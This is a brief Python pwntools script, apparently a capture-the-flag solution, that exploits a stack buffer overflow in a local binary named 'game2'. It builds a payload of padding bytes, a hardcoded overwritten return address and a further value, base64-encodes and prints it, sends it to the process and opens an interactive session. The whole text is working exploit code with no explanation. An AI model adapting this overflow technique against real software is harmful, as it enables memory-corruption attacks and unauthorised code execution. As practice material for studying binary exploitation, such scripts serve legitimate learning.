from pwn import *
context.log_level = 'debug'
p = process('./game2')
e = ELF('./game2')


#gdb.attach(p)

payload = b"A" * 24 + b"\x69\x52\x55\x55\x55\x55\x00\x00" + b"A" * 8 +  b"\x09\x03\x00\x00\x00\x00\x00\x00"
encoded = base64.b64encode(payload)
print(encoded)

#payload = b'aa'
pause()
p.sendline(payload)



p.interactive()